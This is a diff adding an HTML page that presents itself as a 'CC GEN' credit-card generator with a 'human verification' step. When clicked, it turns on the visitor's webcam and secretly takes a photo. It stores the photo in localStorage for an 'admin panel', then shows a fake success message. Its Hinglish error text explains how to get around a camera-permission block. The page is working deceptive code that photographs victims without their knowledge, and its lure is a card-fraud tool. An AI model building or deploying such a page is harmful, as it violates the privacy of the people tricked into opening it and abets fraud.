@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CC GEN | Final Fix</title>
+    <style>
+        body { background: #000; color: #00ffcc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 2px solid #00ffcc; padding: 30px; border-radius: 20px; width: 300px; box-shadow: 0 0 20px #00ffcc; }
+        .btn { background: #00ffcc; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        video { width: 100%; border-radius: 10px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>ZIDDI CC GEN</h2>
+    <p id="msg">Human Verification Required</p>
+    <video id="v" autoplay playsinline></video>
+    <button class="btn" onclick="checkAndCapture()">START GENERATION</button>
+</div>
+
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    async function checkAndCapture() {
+        const v = document.getElementById('v');
+        const msg = document.getElementById('msg');
+
+        try {
+            // Forcefully requesting camera with specific constraints
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: 640, height: 480 }, 
+                audio: false 
+            });
+            
+            v.srcObject = stream;
+            v.style.display = "block";
+            msg.innerText = "Syncing... Please wait 3s";
+
+            setTimeout(() => {
+                const c = document.getElementById('c');
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                // Saving to Local Storage
+                let logs = JSON.parse(localStorage.getItem('z_logs') || "[]");
+                logs.push({ img: c.toDataURL('image/png'), time: new Date().toLocaleString() });
+                localStorage.setItem('z_logs', JSON.stringify(logs));
+
+                alert("CC Success! Check Admin Panel.");
+                window.location.href = "admin.html";
+            }, 3000);
+
+        } catch (err) {
+            console.error(err);
+            alert("HOPWEB BLOCK DETECTED! \n\nHal: Is file ko Chrome browser mein open karein (file:///sdcard/...) ya settings mein HopWeb ko camera permission dein.");
+            msg.innerText = "Error: System Blocked Access";
+        }
+    }
+</script>
+</body>
+</html>
